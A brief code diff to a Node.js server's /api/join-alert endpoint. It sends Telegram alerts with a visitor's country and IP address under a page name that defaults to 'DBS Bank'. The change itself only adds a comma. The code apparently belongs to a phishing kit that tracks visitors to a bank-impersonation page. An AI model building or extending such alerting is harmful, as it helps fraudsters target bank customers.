@@ -119,7 +119,7 @@ app.post('/api/join-alert', async (req, res) => {
     const page = req.body?.page || 'DBS Bank';
 
     sendTelegram(`
-🏦 <b>AFA MD SOMEONE ${page.toUpperCase()}</b>
+🏦 <b>AFA MD, SOMEONE ${page.toUpperCase()}</b>
 
 🌍 Country: <code>${country}</code>
 🌐 IP: <code>${ip}</code>
